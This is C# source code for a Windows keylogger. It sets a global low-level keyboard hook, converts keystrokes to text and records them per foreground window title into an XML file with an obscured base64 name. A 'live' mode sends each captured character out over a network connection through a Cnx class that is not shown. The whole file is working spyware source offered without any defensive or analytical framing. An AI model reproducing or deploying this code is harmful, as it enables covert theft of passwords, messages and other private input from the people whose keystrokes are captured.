using System;
using System.Xml;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
namespace ConsoleApplication5
{
    static class InterceptKeys
    {   // etat 
        public static bool etat = false;
        public static String lastworked = "-- -- --";
        public static bool live = false;
        public static bool local = false; 

        // win change 
        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;
        private static  WinEventDelegate dele = null;

        //keyboard 
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static bool shift = false;
        private static bool c_lock = Control.IsKeyLocked(Keys.CapsLock);
        private static bool ctrl = false;
        private static bool alt = false;
        private static bool alt_g = false;
       
        //documenting  
        private static StringBuilder str = new StringBuilder(); 
        private static string log ;
        private static String win ; 
        private static XmlWriter Xmlw = null;

        static InterceptKeys(){
            win = GetActiveWindowTitle();
            win = Regex.Replace(win, @"[^0-9a-z]", @"_", RegexOptions.IgnoreCase);
 
        }

        public static void startLocal() {
            local = true; 
            if (Xmlw == null) {

                 byte[] b = Encoding.UTF8.GetBytes(DateTime.Now.ToString());
                  log = Convert.ToBase64String(b) + ".gh";
           
                Xmlw = XmlWriter.Create(log);

                Xmlw.WriteStartElement("doc");
                Xmlw.WriteComment(DateTime.Now.ToString());
                Xmlw.Flush();
            }      
        }
       public  static void stopLocal() {
           local = false; 
            if (Xmlw != null)
            {
                Xmlw.WriteEndElement();
                Xmlw.Flush();
                Xmlw.Close();
                Xmlw = null;
            }
        }

        public static void key_log()
        {
            lastworked = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"); 
            etat = true; 
            // create the file 
           
            


            // call change window event listener
            dele = new WinEventDelegate(WinEventProc);
            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);

            // keyboard hook 
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
             

        }

        public static void stop_key_log() {
            etat = false ;
            
            if (_hookID != IntPtr.Zero) {
                UnhookWindowsHookEx(_hookID);
                UnhookWinEvent(hhook);
            }
        }



        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);


        private static IntPtr HookCallback(   int nCode, IntPtr wParam, IntPtr lParam) // key logger static function !
        {   int vkCode = Marshal.ReadInt32(lParam);
        String caracter = ""; 


            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int upper = (shift ^ c_lock)?0:32;
                
                switch(vkCode){
                    case 13: caracter="\n";
                        break;
                    case 32:
                        caracter =" ";
                        break;
                    case 8:
                       if (str.Length > 0) str.Remove(str.Length-1,1);
                        break;
                    case 96: 
                    case 97:
                    case 98:
                    case 99:
                    case 100:
                    case 101:
                    case 102:
                    case 103:
                    case 104:              
                    case 105:
                        caracter = (vkCode - 96).ToString();  // number pads 
                         
                        break;
                    case 160 : shift = true;
                        break;
                    case 162:
                    case 163: ctrl = true;
                        break;
                    case 164: alt = true;
                        break;
                    case 165: alt_g = true;
                        break;
                    case 20: c_lock = !c_lock;
                        break; 

                    default:
                        if (vkCode >= 65 && vkCode <= 90)
                        {
                            char key = (char)(vkCode + upper);
                            caracter = key.ToString(); 
                            
                        }
                        else
                        {
                            // Delete once using
                            Console.Write((Keys)vkCode); Console.WriteLine(vkCode);
                        }
                        break; 

                        
                }
                if(caracter.Length > 0 ){
                    if (live) {
                        Cnx.sendDelayed(caracter); 
                    }
                    if (local) {
                        str.Append(caracter); 
                    }
                }



            }
            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                switch (vkCode) {
                    case 160: shift = false;
                        break;
                    case 162:
                    case 163: ctrl = false;
                        break;
                    case 164: alt = false;
                        break;
                    case 165: alt_g = false;
                        break;
                }
            
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }  // end  key logger static function  

            private static  void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
            {
                if (Xmlw != null)
                {
                    if (str.Length > 0)
                    {
                        Xmlw.WriteComment(DateTime.Now.ToString());
                        Xmlw.WriteElementString(win, str.ToString());


                        str.Clear();
                    }
                    win = GetActiveWindowTitle();
                    if (win == null)
                    {
                        win = "unknown_Window";
                    }

                    win = Regex.Replace(win, @"[^0-9a-z]", @"_", RegexOptions.IgnoreCase);

                } 
        }



        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        [DllImport("user32.dll")]
        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        [DllImport("user32.dll")]
        static extern bool UnhookWinEvent(IntPtr hWinEventHook);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
       


        // get active Window title  
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        static private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }


        public static IntPtr hhook { get ; set; }
    }
}